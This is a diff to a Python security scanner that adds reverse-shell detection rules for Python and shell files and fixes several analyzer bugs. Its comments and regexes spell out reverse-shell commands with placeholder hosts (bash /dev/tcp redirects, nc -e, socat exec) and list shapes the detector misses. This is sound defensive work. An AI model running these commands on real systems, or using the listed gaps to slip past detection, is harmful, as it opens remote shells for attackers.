@@ -1177,7 +1177,10 @@ _TUNNEL_ARGV_SUBCOMMANDS = {
 _CLOUDFLARED_TUNNEL_SUBCOMMANDS = {"--url", "run", "create"}
 # `\bssh\s+(?:-\w+\s+)*-R\s+\S*:\S+:\d+` -- the port-forward spec immediately after a
 # literal "-R" element, e.g. "8080:localhost:22".
-_SSH_R_SPEC_RE = re.compile(r"^\S*:\S+:\d+$")
+# C-730: linear time. `^\S*:` could stop at ANY colon and `\S+:\d+$` then rescanned the rest,
+# n^2 on a word of colons. A word matches exactly when it does with the split at its FIRST
+# colon (what follows that colon only gets longer), so the first part may not hold a colon.
+_SSH_R_SPEC_RE = re.compile(r"^[^\s:]*:\S+:\d+$")
 
 
 def _argv_str_elts(node: ast.List | ast.Tuple) -> list[str | None]:
@@ -1284,7 +1287,14 @@ def _is_trusted_installer_url(url: str) -> bool:
         return False
     if p.scheme != "https":
         return False
-    if p.port is not None or p.query or p.fragment:
+    try:
+        has_port = p.port is not None
+    except ValueError:
+        # C-652: `.port` is lazy and raises on a non-numeric ("$PORT") or out-of-range
+        # port, which urlparse() itself accepts. A port that cannot be read is not the
+        # canonical installer URL: fail closed (not trusted -> the finding is kept), never raise.
+        return False
+    if has_port or p.query or p.fragment:
         return False
     host = (p.hostname or "").lower()
     path = p.path or ""
@@ -2510,6 +2520,10 @@ def _external_tainted_names(
 # NARROWS rather than closes: a two-hop chain (helper A returns helper B's fetch) or a
 # fetch routed through a class attribute is still missed. Widening further needs its own
 # C-135 pass, because each extra hop multiplies the over-taint risk this rule avoids.
+# Also not recognised (C-631, disclosed rather than silent): (i) a helper that fetches
+# via `with urlopen(u) as r: return r.read()` - `_remote_returning_funcs` tracks Assign
+# bindings only, not `with ... as` targets; (ii) a helper imported from another module -
+# only helpers DEFINED in the scanned file are known to be remote-returning.
 _REMOTE_FETCH_ATTRS = {"urlopen", "urlretrieve", "get", "post", "request"}
 _REMOTE_FETCH_BASES = {
     "requests",
@@ -2637,21 +2651,29 @@ def _remote_code_load_findings(tree: ast.AST, facts=None) -> list[tuple[int, str
     urllib.request import ...`) is recognised as remote-returning too, not only the
     attribute-call spelling -- see `_is_remote_fetch_call`'s own docstring. Opt-in,
     defaults to `None` (unchanged prior behaviour) like every other consumer of this
-    predicate."""
+    predicate.
+
+    C-631: the helper call may also sit INLINE in the sink's own arguments
+    (`exec(fetch(URL))`, `exec(compile(fetch(URL), ...))`) -- nothing is assigned there,
+    so no tainted NAME exists, and the inline call itself is the source."""
     remote_funcs = _remote_returning_funcs(tree, facts)
     if not remote_funcs:
         return []
+
+    def _calls_remote_helper(expr: ast.AST) -> bool:
+        return any(
+            isinstance(sub, ast.Call)
+            and isinstance(sub.func, ast.Name)
+            and sub.func.id in remote_funcs
+            for sub in ast.walk(expr)
+        )
+
     tainted: set[str] = set()
     assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
     for _ in range(6):
         changed = False
         for a in assigns:
-            hop = any(
-                isinstance(sub, ast.Call)
-                and isinstance(sub.func, ast.Name)
-                and sub.func.id in remote_funcs
-                for sub in ast.walk(a.value)
-            )
+            hop = _calls_remote_helper(a.value)
             if not (hop or (_names_in(a.value) & tainted)):
                 continue
             for t in a.targets:
@@ -2660,8 +2682,6 @@ def _remote_code_load_findings(tree: ast.AST, facts=None) -> list[tuple[int, str
                     changed = True
         if not changed:
             break
-    if not tainted:
-        return []
     found: list[tuple[int, str]] = []
     for node in ast.walk(tree):
         if not isinstance(node, ast.Call):
@@ -2670,6 +2690,14 @@ def _remote_code_load_findings(tree: ast.AST, facts=None) -> list[tuple[int, str
         if not (isinstance(f, ast.Name) and f.id in _REMOTE_CODE_EXEC_SINKS):
             continue
         any_t, _direct = _call_args_tainted(node, tainted)
+        if not any_t:
+            # C-631: the helper called INLINE in the sink's own arguments - nothing is
+            # ever assigned, so no tainted NAME exists. Same dataflow the assign path
+            # convicts; mirrors `_call_args_tainted_for_exec_sink`'s inline-source rule.
+            any_t = any(
+                _calls_remote_helper(a)
+                for a in list(node.args) + [kw.value for kw in node.keywords]
+            )
         if any_t:
             found.append(
                 (
@@ -6870,6 +6898,359 @@ def _net_sink_alias_names(tree: ast.AST) -> frozenset[str]:
         if not changed:
             break
     return frozenset(aliases)
+
+
+# C-630: SOCKET_STDIO_SHELL -- a Python reverse/bind shell in the clear. The `socket` ctor
+# helpers above (`_net_sink_alias_names`) answer "is this name a network SINK"; this answers
+# the different question "is this name a SOCKET that can be wired to a child's stdio", so
+# it has its own small fixpoint (it also follows `create_connection`/`fromfd`/`accept()`/
+# `wrap_socket`, which the sink alias set has no reason to).
+#
+# Two closed wirings, each ALSO requiring a shell exec, so a socket that merely `send`s and
+# `recv`s, and an ordinary `subprocess.run(["sh", "-c", cfg])` with no socket wiring, stay
+# silent (the two halves must be wired together, not merely co-occur):
+#   (a) `os.dup2(<socket>.fileno(), 0)` (stdin at least; 0/1/2, a `for i in range(3)` loop
+#       variable, or `sys.stdin.fileno()` all count) anywhere in the file, plus a shell exec
+#       (subprocess.*/os.system/os.exec*/os.spawn*/pty.spawn) naming a BARE shell;
+#   (b) one `subprocess.*(<shell>, stdin=<socket>, ...)` call -- the shell and the socket
+#       are wired in the SAME call.
+# "BARE" = the shell plus option flags only (`/bin/sh -i`): a script operand (`sh handler.sh`,
+# an inetd-style handler that only READS the socket) and `-c CMD` are not a shell taking its
+# commands from the socket, so they stay silent, as does a Windows shell given any argument.
+# DECLARED CEILING (docs/THREAT_COVERAGE.md): a shell named only through a runtime value,
+# a socket handed to another module, `s.makefile()` as stdin. (`os.environ["SHELL"]` as the
+# program is convicted by TT5_CMD_INJECTION, not by this rule.)
+_SOCKET_CTOR_ATTRS = frozenset({"socket", "create_connection", "fromfd", "create_server"})
+_REV_SHELL_BASENAMES = frozenset(
+    {"sh", "bash", "zsh", "ksh", "dash", "ash", "csh", "tcsh", "fish"}
+)
+# Windows shells count only with NO arguments at all (`Popen(["cmd.exe"], stdin=s, ...)`): their
+# option grammar (`/c`, `-Command`, `-EncodedCommand`) carries a command as readily as a POSIX
+# `-c`, and the case-insensitive flag table needed to tell them apart is not worth a rule.
+_REV_WINDOWS_SHELLS = frozenset({"cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh", "pwsh.exe"})
+_REV_SUBPROC_CALLS = frozenset({"call", "run", "Popen", "check_call", "check_output"})
+_REV_OS_EXEC_RE = re.compile(
+    r"^(?:system|popen|exec(?:l|le|lp|lpe|v|ve|vp|vpe)|spawn(?:l|le|lp|lpe|v|ve|vp|vpe)?)$"
+)
+
+
+def _rev_call_name(call: ast.Call) -> str:
+    f = call.func
+    if isinstance(f, ast.Attribute):
+        return f.attr
+    if isinstance(f, ast.Name):
+        return f.id
+    return ""
+
+
+def _socket_bound_keys(tree: ast.AST) -> frozenset:
+    """Dotted keys (`s`, `self.sock`) assigned, transitively, from a socket-producing
+    call: `socket.socket(...)`, `create_connection`, `fromfd`, `create_server`,
+    `<socket>.accept()[0]` / `conn, _ = <socket>.accept()`, `<ctx>.wrap_socket(<socket>)`,
+    `<socket>.dup()` and plain aliases. Import aliases (`import socket as sk`,
+    `from socket import create_connection as cc`) are honoured."""
+    mod_aliases = {"socket"}
+    ctor_names: set = set()
+    for n in ast.walk(tree):
+        if isinstance(n, ast.Import):
+            for a in n.names:
+                if a.name == "socket":
+                    mod_aliases.add(a.asname or "socket")
+        elif isinstance(n, ast.ImportFrom) and n.module == "socket" and not n.level:
+            for a in n.names:
+                if a.name in _SOCKET_CTOR_ATTRS:
+                    ctor_names.add(a.asname or a.name)
+    pairs = []  # (target node, value node)
+    for n in ast.walk(tree):
+        if isinstance(n, ast.Assign):
+            for t in n.targets:
+                pairs.append((t, n.value))
+        elif isinstance(n, (ast.With, ast.AsyncWith)):
+            for item in n.items:
+                if item.optional_vars is not None:
+                    pairs.append((item.optional_vars, item.context_expr))
+    socks: set = set()
+
+    def is_sock_expr(v: ast.AST) -> bool:
+        if isinstance(v, (ast.Name, ast.Attribute)):
+            return _dotted_path(v) in socks
+        if isinstance(v, ast.Subscript):  # `s.accept()[0]`
+            return (
+                isinstance(v.value, ast.Call)
+                and _rev_call_name(v.value) == "accept"
+                and isinstance(v.value.func, ast.Attribute)
+                and _dotted_path(v.value.func.value) in socks
+            )
+        if not isinstance(v, ast.Call):
+            return False
+        f = v.func
+        if isinstance(f, ast.Attribute):
+            if (
+                isinstance(f.value, ast.Name)
+                and f.value.id in mod_aliases
+                and f.attr in _SOCKET_CTOR_ATTRS
+            ):
+                return True
+            if f.attr == "dup" and _dotted_path(f.value) in socks:
+                return True
+            if f.attr == "wrap_socket" and v.args and _dotted_path(v.args[0]) in socks:
+                return True
+        elif isinstance(f, ast.Name) and f.id in ctor_names:
+            return True
+        return False
+
+    for _ in range(4):
+        changed = False
+        for tgt, val in pairs:
+            names = []
+            if isinstance(tgt, (ast.Name, ast.Attribute)):
+                if is_sock_expr(val):
+                    names.append(tgt)
+            elif (
+                isinstance(tgt, (ast.Tuple, ast.List))
+                and tgt.elts
+                and isinstance(val, ast.Call)
+                and _rev_call_name(val) == "accept"
+                and isinstance(val.func, ast.Attribute)
+                and _dotted_path(val.func.value) in socks
+            ):
+                names.append(tgt.elts[0])  # `conn, addr = s.accept()`
+            for t in names:
+                if isinstance(t, (ast.Name, ast.Attribute)):
+                    k = _dotted_path(t)
+                    if k and k not in socks:
+                        socks.add(k)
+                        changed = True
+        if not changed:
+            break
+    return frozenset(socks)
+
+
+def _rev_is_socket_ref(node: ast.AST, socks: frozenset, fileno_names: frozenset) -> bool:
+    """`s`, `s.fileno()`, or a name bound from `s.fileno()`."""
+    if isinstance(node, (ast.Name, ast.Attribute)):
+        k = _dotted_path(node)
+        return k in socks or k in fileno_names
+    if (
+        isinstance(node, ast.Call)
+        and isinstance(node.func, ast.Attribute)
+        and node.func.attr == "fileno"
+    ):
+        return _dotted_path(node.func.value) in socks
+    return False
+
+
+def _rev_stdio_fd_values(node: ast.AST, loop_fds: dict) -> set:
+    """Which of the standard fds {0, 1, 2} the expression denotes (may be several for a
+    loop variable over `range(3)` / `(0, 1, 2)`)."""
+    if isinstance(node, ast.Constant) and isinstance(node.value, int) and not isinstance(
+        node.value, bool
+    ):
+        return {node.value} & {0, 1, 2}
+    if isinstance(node, ast.Name):
+        return set(loop_fds.get(node.id, ()))
+    if (
+        isinstance(node, ast.Call)
+        and isinstance(node.func, ast.Attribute)
+        and node.func.attr == "fileno"
+    ):
+        p = _dotted_path(node.func.value).replace("__", "")
+        return {"sys.stdin": {0}, "sys.stdout": {1}, "sys.stderr": {2}}.get(p, set())
+    return set()
+
+
+def _rev_loop_fds(tree: ast.AST) -> dict:
+    """`for i in range(3)` / `for fd in (0, 1, 2)` (also as a comprehension) ->
+    {name: {0, 1, 2} & values}."""
+    out: dict = {}
+    for n in ast.walk(tree):
+        if not (isinstance(n, (ast.For, ast.AsyncFor, ast.comprehension))
+                and isinstance(n.target, ast.Name)):
+            continue
+        it = n.iter
+        vals: set = set()
+        if (
+            isinstance(it, ast.Call)
+            and isinstance(it.func, ast.Name)
+            and it.func.id == "range"
+            and it.args
+            and all(isinstance(a, ast.Constant) and isinstance(a.value, int) for a in it.args)
+            and len(it.args) <= 3
+        ):
+            # Never materialise the range: `range(999999999)` is a legal literal and
+            # `set(range(N))` is O(N) time and memory (a MemoryError here would abort the
+            # whole analyzer and let one hostile line suppress every other finding in the
+            # file). `int in range(...)` is O(1) arithmetic, and only 0/1/2 can matter.
+            try:
+                rng = range(*[a.value for a in it.args])
+                vals = {fd for fd in (0, 1, 2) if fd in rng}
+            except (ValueError, TypeError, OverflowError):  # range(0, 3, 0) and friends
+                vals = set()
+        elif isinstance(it, (ast.Tuple, ast.List)):
+            vals = {
+                e.value
+                for e in it.elts
+                if isinstance(e, ast.Constant) and isinstance(e.value, int)
+            }
+        vals &= {0, 1, 2}
+        if vals:
+            out.setdefault(n.target.id, set()).update(vals)
+    return out
+
+
+def _rev_const_words(arg: ast.AST, const_strs: dict) -> "list | None":
+    """The literal words an argument denotes: a str is split on whitespace, an argv
+    list/tuple contributes its elements, a name bound once to a str constant resolves to
+    that str. None when any element is not a literal (the command is then not provably a
+    bare shell, so it is not convicted)."""
+    if isinstance(arg, (ast.List, ast.Tuple)):
+        words: list = []
+        for e in arg.elts:
+            if isinstance(e, ast.Name) and e.id in const_strs:
+                words.append(const_strs[e.id])
+            elif isinstance(e, ast.Constant) and isinstance(e.value, str):
+                words.append(e.value)
+            else:
+                return None
+        return words
+    if isinstance(arg, ast.Name):
+        text = const_strs.get(arg.id)
+    elif isinstance(arg, ast.Constant) and isinstance(arg.value, str):
+        text = arg.value
+    else:
+        return None
+    return None if text is None else text.split()
+
+
+# Flags a launched shell may carry and still be "a bare interactive shell": `-i`, `-l`,
+# `-li`, `-s`, `--login`, `--noprofile`... but NEVER `-c` (its command is the argument, not
+# the socket) and never a script/positional operand (`sh handler.sh`, an inetd-style
+# handler that only READS the socket). Judged per word, so `-ic` / `-c` are refused.
+_REV_SHELL_FLAG_RE = re.compile(r"^(?:-[a-zA-Z]+|--[a-z][a-z-]*)$")
+
+
+def _rev_words_are_bare_shell(words: "list | None") -> bool:
+    """`words` is exactly a shell interpreter plus option flags (`/bin/sh -i`)."""
+    if not words:
+        return False
+    words = list(words)
+    if words[0] == "exec":
+        words = words[1:]
+    if not words:
+        return False
+    prog = words[0].replace("\\", "/").rsplit("/", 1)[-1].lower()
+    windows = prog in _REV_WINDOWS_SHELLS
+    if prog not in _REV_SHELL_BASENAMES and not windows:
+        return False
+    rest = words[1:]
+    # `os.execv("/bin/sh", ["sh", "-i"])` / `os.execl("/bin/sh", "sh", "-i")`: argv[0] repeats
+    # the program name.
+    if rest and rest[0].replace("\\", "/").rsplit("/", 1)[-1].lower() == prog:
+        rest = rest[1:]
+    if windows:
+        return not rest
+    for w in rest:
+        if not _REV_SHELL_FLAG_RE.match(w) or (not w.startswith("--") and "c" in w):
+            return False
+    return True
+
+
+def _rev_call_shell_exec(call: ast.Call, const_strs: dict) -> str:
+    """"subprocess" / "os" when this call is a process launch of a BARE shell, else ""."""
+    name = _rev_call_name(call)
+    if name in _REV_SUBPROC_CALLS:
+        cands = list(call.args[:1]) + [k.value for k in call.keywords if k.arg == "args"]
+        kind = "subprocess"
+        return kind if any(
+            _rev_words_are_bare_shell(_rev_const_words(a, const_strs)) for a in cands
+        ) else ""
+    if _REV_OS_EXEC_RE.match(name):
+        args = list(call.args)
+        if name.startswith("spawn") and name != "spawn":
+            args = args[1:]  # os.spawn*'s first argument is the mode
+        words: list = []
+        for a in args[:3]:
+            w = _rev_const_words(a, const_strs)
+            if w is None:
+                break
+            words.extend(w)
+        return "os" if _rev_words_are_bare_shell(words) else ""
+    return ""
+
+
+def _socket_stdio_shell_findings(tree: ast.AST) -> list:
+    """`[(lineno, reason)]` -- see the C-630 block above."""
+    socks = _socket_bound_keys(tree)
+    if not socks:
+        return []
+    fileno_names = set()
+    for n in ast.walk(tree):
+        if (
+            isinstance(n, ast.Assign)
+            and isinstance(n.value, ast.Call)
+            and isinstance(n.value.func, ast.Attribute)
+            and n.value.func.attr == "fileno"
+            and _dotted_path(n.value.func.value) in socks
+        ):
+            fileno_names.update(_dotted_path(t) for t in n.targets if isinstance(t, ast.Name))
+    fileno_names = frozenset(fileno_names)
+    const_strs: dict = {}
+    counts: dict = {}
+    for n in ast.walk(tree):
+        if isinstance(n, ast.Assign) and isinstance(n.value, ast.Constant) and isinstance(
+            n.value.value, str
+        ):
+            for t in n.targets:
+                if isinstance(t, ast.Name):
+                    counts[t.id] = counts.get(t.id, 0) + 1
+                    const_strs[t.id] = n.value.value
+        elif isinstance(n, (ast.Assign, ast.AugAssign, ast.AnnAssign)):
+            for t in (n.targets if isinstance(n, ast.Assign) else [n.target]):
+                if isinstance(t, ast.Name):
+                    counts[t.id] = counts.get(t.id, 0) + 2  # rebound to a non-constant
+    const_strs = {k: v for k, v in const_strs.items() if counts.get(k) == 1}
+    loop_fds = _rev_loop_fds(tree)
+    stdin_wired = False
+    for n in ast.walk(tree):
+        if (
+            isinstance(n, ast.Call)
+            and _rev_call_name(n) == "dup2"
+            and len(n.args) >= 2
+            and _rev_is_socket_ref(n.args[0], socks, fileno_names)
+            and 0 in _rev_stdio_fd_values(n.args[1], loop_fds)
+        ):
+            stdin_wired = True
+            break
+    out = []
+    for n in ast.walk(tree):
+        if not isinstance(n, ast.Call):
+            continue
+        kind = _rev_call_shell_exec(n, const_strs)
+        if not kind:
+            continue
+        ln = getattr(n, "lineno", 0)
+        same_call = kind == "subprocess" and any(
+            k.arg == "stdin" and _rev_is_socket_ref(k.value, socks, fileno_names)
+            for k in n.keywords
+        )
+        if same_call:
+            out.append(
+                (
+                    ln,
+                    "a shell is launched with a network socket as its stdin "
+                    "(subprocess ..., stdin=<socket>) \u2014 reverse/bind shell",
+                )
+            )
+        elif stdin_wired:
+            out.append(
+                (
+                    ln,
+                    "a network socket is dup2'd onto the process's stdin and this file "
+                    "launches a bare shell (os.dup2(sock.fileno(), 0) + a shell exec; the two "
+                    "are tied file-wide, not per function) \u2014 reverse/bind shell",
+                )
+            )
+    return out
 
 
 def _is_net_sink(func: ast.AST, net_sink_aliases: frozenset[str] = frozenset()) -> bool:
@@ -13122,6 +13503,14 @@ def analyze_python(
                 "curl|sh match)",
             )
 
+    # C-630: SOCKET_STDIO_SHELL - a socket wired to a shell's stdio (dup2 onto stdin, or
+    # `stdin=<socket>` in the launching call). crit like the shell twin SHELL_REVERSE_SHELL:
+    # a shell whose commands arrive over a network socket is a remote-access shell by
+    # construction; it is not in checks/_vet.py's _AST_NEVER_FAIL_RULES, so it is
+    # FAIL-capable in B13/--vet.
+    for _ss_ln, _ss_reason in _socket_stdio_shell_findings(tree):
+        add("SOCKET_STDIO_SHELL", "crit", _ss_ln, _ss_reason)
+
     # TUNNEL_LAUNCH_ARGV - an argv-list tunnel/mesh-VPN launch
     # primitive (see the module comment above `_TUNNEL_ARGV_BARE_PROGRAMS`). info (not
     # crit), matching DROPPER_DOWNLOAD_TO_TMP/CHUNKED_FILE_EXEC's grade - checks/_vet.py's
@@ -15716,6 +16105,664 @@ def _sh_bare_nc_invocation(line: str) -> bool:
     return False
 
 
+# C-630: SHELL_REVERSE_SHELL -- the PLAINTEXT reverse-shell primitives a bundled .sh can carry.
+# Before this rule the same payload FAILed base64-wrapped (B-121 decodes it and finds
+# `/dev/tcp/`) and vetted INSTALL in the clear, so the scanner rewarded NOT obfuscating.
+#
+# CLOSED shapes only. Each requires the interpreter/tool to sit in real COMMAND POSITION
+# (`_sh_nc_command_position`, extended below for `{`, `case` arms and `if`/`while`), and the
+# flag/redirect that wires it to a socket to sit OUTSIDE any quote -- so an `echo`/`grep`/
+# `printf` mentioning the payload, a detection signature such as
+# `grep -E 'bash -i >& /dev/tcp|nc -e'`, or a bare port probe never fires:
+#
+#   1. a BARE shell interpreter (no script operand, no `-c`) whose stdio is bound to
+#      `/dev/tcp|udp/H/P`: interactive (`-i`) or with stdin dup'd (`0<&1`) beside an
+#      output redirect -- `bash -i >& /dev/tcp/H/P 0>&1` -- or reading its commands
+#      straight from the socket (`sh -s < /dev/tcp/H/P`). `cat </dev/tcp/H/P`,
+#      `bash -c '</dev/tcp/H/P'`, `bash report.sh -i all > /dev/tcp/H/P` (the `-i` belongs to
+#      the script) and `bash -i >& /dev/null` have no interpreter-level binding: silent.
+#   2. `nc`/`ncat`/`netcat` with an exec flag (`-e`/`-c`/`--exec`/`--sh-exec`) whose value
+#      names a shell. `nc -z` and `.nc`/`jq -nc`/`${NC}` never reach it; a QUOTED value must
+#      be the shell plus flags only (`-c 'bash ./handler.sh'` is an inetd-style handler).
+#   3. `socat` with an `exec:`/`system:` address whose whole program IS a shell, next to a
+#      network address (`tcp:`/`udp:`/`ssl:`...). `exec:'bash /opt/handler.sh'` and a plain
+#      relay stay silent.
+#   4. `exec N<>/dev/tcp/H/P` then a bare shell whose stdin (or, with `-i`, stdio) is dup'd
+#      from that same fd: `sh <&196 >&196 2>&196`. The HTTP-client idiom (`>&3`/`<&3` on
+#      `echo`/`cat`) binds no interpreter, so it stays silent.
+#
+# `sh|bash ... -c '<payload>'` and `eval '<payload>'` are unwrapped (two levels at most) so
+# the canonical `bash -c 'bash -i >& /dev/tcp/H/P 0>&1'` is still a command-position hit;
+# the wrapper itself must be in command position, so an `echo "sh -c '...'"` is not.
+# Heredoc bodies are scanned as code like every sibling SHELL_* rule (a payload staged with
+# `cat > f <<EOF` is therefore caught; a usage-text heredoc, or a multi-line quoted string,
+# whose own line starts with `nc -e /bin/sh` is the corresponding false-positive shape --
+# measured: it IS convicted, because the scan is per logical line and knows no heredoc).
+#
+# COST: linear in the line, with a small constant. The quote mask, the unquoted delimiter
+# positions and every evidence pattern's positions are computed ONCE per logical line, and so
+# are the words of the line, their kinds and "the nearest word that is not a pass-through" for
+# the command-position walk (`_ShRevPos`): each candidate token is answered by a bisect, never
+# a rescan of its tail or a re-split of its look-back. (The first draft rescanned up to 4 KB per
+# token; the second re-sliced and re-split a 600-character window -- ~200 words -- per token,
+# so cost followed the NUMBER of candidate tokens, not the bytes: one dense
+# `nc nc nc ... -e sh` file of 965 KB cost 10 to 20 CPU-seconds depending on machine load,
+# about 10x the cost without this rule, and two such skills took the full audit's 15 s
+# per-check budget with them, B13 UNKNOWN and another finding in the same skill lost. C-135
+# round 3.) Measured 2026-10-05, CPU, ~1 MB hostile files that never convict: eleven dense
+# shapes -- `nc`/`socat`/`>sh`/`+sh`/`nc=1` chains, a `sh -c 'x'` wrapper chain, quoted and
+# backslash-escaped command names -- cost 0.7 to 3.3 s (the worst, a chain of `nc=1` words
+# that are pass-throughs for the walk, ~3.3 us per byte). Wrapper chains whose bodies carry a
+# cue cost more: `sh -c 'nc'; ` repeated about 3.3 s, and a two-level `sh -c "sh -c 'nc'"; `
+# chain about 4.1 s, the highest measured (3.5 to 3.8x the cost without this rule). These are
+# measurements, not an upper bound. One capped walk remains per shell
+# token that IS a command name and has a socket in reach: the option words of its tail
+# (`_SH_REV_TAIL_WORDS`, 16). The command-position look-back (`_SH_REV_WINDOW`, 600 chars) is
+# an O(1) lookup that gives the answer the window walk gave (a differential test pins it). The
+# word cap is the C-135 round-2 fix: a glued-redirect chain (`>sh >sh >sh ...`) never reaches
+# an operand, so the uncapped walk re-read ~1000 words per token (1.3 s per 4 KB block,
+# quadratic) and one hostile .sh exhausted the check's time budget, hiding another skill's FAIL.
+# A wrapper body (`sh -c '...'`, `eval '...'`) is scanned only when it can carry a primitive at
+# all -- the same cue / `&` gate the line itself passed -- so a megabyte of `sh -c 'x'` decoys
+# does not pay a full scan per empty body.
+#
+# COMMENTS (C-135 review): a trailing `# note` is blanked per PHYSICAL line before any of
+# this runs (`_sh_rev_lex`), so it can neither turn a bare shell into "a shell with a
+# script operand" nor contribute payload words as evidence. A comment that ends in a
+# backslash does not continue, and a `#` that is escaped, quoted, glued mid-word or inside
+# `${...}` is not a comment. Only a blank-preceded `#` counts (`echo a;#b` is left as code:
+# fewer comments is the conservative direction). A glued redirect (`-i>&/dev/tcp/H/P`) is
+# judged by its option prefix, not by the letters of its target (`tcp` holds a `c`).
+#
+# BOUNDS (declared, docs/THREAT_COVERAGE.md): a shell's arguments are read for at most
+# `_SH_REV_TAIL_MAX` (4096) characters and a command-position walk looks back at most
+# `_SH_REV_WINDOW` (600) characters, fenced by a blocking sentinel. Padding past either bound
+# (3000 x ` -x` between `bash -i` and the redirect; a 5000-character `x=...` assignment in
+# front) is a known miss: both bounds are what keeps the scan bounded. The OPTION-word cap
+# (`_SH_REV_TAIL_WORDS`) is deliberately not a miss: an option run that long is answered "no
+# operand, interactive" (still a bare shell), so padding options in front of the redirect
+# cannot hide a payload; the price is that a shell given 16 or more option words and THEN a script
+# operand, with a socket redirect on the same command, reads as bare (a shape no real
+# script is expected to have; measured 2026-09-30: the only hits in 18,453 local shell
+# files are a competitor's known-malicious polyglot.sh sample).
+#
+# DECLARED CEILING (docs/THREAT_COVERAGE.md, Dave 2026-09-30): perl/php/ruby/node reverse
+# shells (and an interpreter one-liner such as `python -c '...socket...'` inside a .sh), a
+# payload in a SKILL.md fenced block, the `mkfifo | sh -i | nc` pipe shape, `read`-loop fd
+# shells, `echo '<payload>' | bash`, variable-reconstructed command names (`D=/dev/tcp/..;
+# bash -i >& $D`), `timeout N nc -e`, `busybox nc -e`, `sudo -u root nc -e`, `su -c '...'` and
+# a shell/socket wired only through a runtime value are NOT chased with more regex -- each
+# is an open-ended enumeration.
+_SH_REV_LB = r"(?<![\w.$/~={}-])"
+_SH_REV_LA = r"(?![\w.$/{}-])"
+_SH_REV_PATH = r"/?(?:[\w.~-]+/)*"
+_SH_REV_POSIX_SHELL = r"(?:(?:ba|z|k|da|a|c|tc)?sh|fish)"
+_SH_REV_ANY_SHELL = r"(?:(?:ba|z|k|da|a|c|tc)?sh|fish|cmd(?:\.exe)?|powershell(?:\.exe)?|pwsh)"
+_SH_REV_SHELL_TOK_RE = re.compile(_SH_REV_LB + _SH_REV_PATH + _SH_REV_POSIX_SHELL + _SH_REV_LA)
+_SH_REV_NC_TOK_RE = re.compile(
+    _SH_REV_LB + _SH_REV_PATH + r"(?:nc|ncat|netcat|nc\.(?:traditional|openbsd))" + _SH_REV_LA
+)
+_SH_REV_SOCAT_TOK_RE = re.compile(_SH_REV_LB + _SH_REV_PATH + r"socat" + _SH_REV_LA)
+_SH_REV_EVAL_TOK_RE = re.compile(_SH_REV_LB + r"eval" + _SH_REV_LA)
+# Where a simple command's arguments end: `;`, `|` (and `||`), `)`, a backtick, `&&`, and a
+# lone `&` (background) -- but never the `&` of `>&`, `<&`, `&>` or `2>&1`.
+_SH_REV_DELIM_RE = re.compile(r"[;|)`]|&&|(?<![<>&])&(?![>&])")
+# a redirect whose target is /dev/tcp|udp: `>&`, `&>`, `>`, `>>`, `<>`, `<` (all forms).
+_SH_REV_DEVTCP_REDIR_RE = re.compile(r"[<>]&?\s*['\"]?/dev/(?:tcp|udp)/")
+# ... and the INPUT-only form (`0< /dev/tcp/H/P`): the shell reads its commands from the socket.
+_SH_REV_DEVTCP_IN_RE = re.compile(r"(?<![\w&>])0?<(?![&<>])\s*['\"]?/dev/(?:tcp|udp)/")
+# stdin dup'd from another fd: `0<&1`, `0>&1`, `<&196`. Captures the source fd.
+_SH_REV_STDIN_DUP_RE = re.compile(r"(?<![\w&])(?:0[<>]|<)&(\d{1,3})(?!\d)")
+_SH_REV_ANY_DUP_RE = re.compile(r"(?<![\w&])\d?[<>]&(\d{1,3})(?!\d)")
+_SH_REV_FDOPEN_RE = re.compile(_SH_REV_LB + r"exec\s+(\d{1,3})<>\s*['\"]?/dev/(?:tcp|udp)/")
+_SH_REV_FDCLOSE_RE = re.compile(_SH_REV_LB + r"exec\s+(\d{1,3})[<>]&-")
+_SH_REV_NC_EXEC_RE = re.compile(
+    r"(?<![\w-])(?:-[A-Za-z]*[ec]|--(?:sh-)?exec)(?:\s+|=)(?:"
+    r"(?P<q>['\"])" + _SH_REV_PATH + _SH_REV_ANY_SHELL + r"(?:\s+-[A-Za-z-]+)*(?P=q)"
+    r"|" + _SH_REV_PATH + _SH_REV_ANY_SHELL + r"(?![\w.$/{}-]))"
+)
+_SH_REV_SOCAT_EXEC_RE = re.compile(
+    r"(?<![\w-])(?:exec|system):\s*(?:"
+    r"(?P<q>['\"])" + _SH_REV_PATH + _SH_REV_ANY_SHELL + r"(?:\s+-[A-Za-z-]+)*(?P=q)"
+    r"|" + _SH_REV_PATH + _SH_REV_ANY_SHELL + r"(?:\s+-[A-Za-z-]+)*"
+    r"(?=[,'\"]|\s*(?:[;|)`&<>]|\d[<>]|$)|\s+[A-Za-z0-9-]+:))",
+    re.I,
+)
+_SH_REV_SOCAT_NET_RE = re.compile(r"(?<![\w-])(?:tcp|udp|ssl|openssl|sctp)[\w-]*:", re.I)
+# `sh -c '`, `bash -lc "`, `sh --norc -c '` -- the wrapper whose quoted body is a command.
+_SH_REV_C_WRAP_RE = re.compile(r"\s+(?:--?[A-Za-z][\w-]*\s+)*-[A-Za-z]*c\s+(['\"])")
+_SH_REV_EVAL_WRAP_RE = re.compile(r"\s+(['\"])")
+# The tail of a shell invocation, word by word: options, redirections, then the first operand.
+_SH_REV_WORD_RE = re.compile(r"\S+")
+_SH_REV_REDIR_OP_RE = re.compile(r"(?:\d*<>|\d*>>?&?|\d*<&?|&>>?)")
+_SH_REV_GLUED_REDIR_RE = re.compile(r"[<>&]")
+_SH_REV_INTERACTIVE_WORD_RE = re.compile(r"-[lxvc]*i[lxvc]*")
+_SH_REV_OPT_WITH_VALUE = frozenset({"-o", "+o", "-O", "+O", "--rcfile", "--init-file"})
+_SH_REV_SEG_KEYWORDS = frozenset({"if", "while", "until"})
+_SH_REV_WINDOW = 600  # chars of prefix a command-position check needs (bounded, O(1)/token)
+_SH_REV_TAIL_MAX = 4096
+# At most this many option/redirect WORDS of a shell's tail are read before it is called
+# "no operand found" (see `_sh_rev_shell_tail`).
+_SH_REV_TAIL_WORDS = 16
+# A logical line is only worth the (Python-level) quote scan if it can carry a primitive.
+_SH_REV_CUE_RE = re.compile(r"/dev/(?:tcp|udp)|\b(?:nc|ncat|netcat|socat)\b")
+
+
+def _sh_rev_lex(text: str, breaks: "list | None" = None) -> tuple:
+    """`(mask, text)` in ONE pass over one logical line.
+
+    `mask` is 1 at every index STRICTLY inside a quoted region (`'...'`, `"..."` and the
+    ANSI-C `$'...'`, whose backslash escapes a `'`; the quote characters themselves are
+    0). With `breaks` (a sorted list, possibly empty) the returned text also has every
+    shell COMMENT blanked, same length; with `breaks=None` the text is returned as is.
+
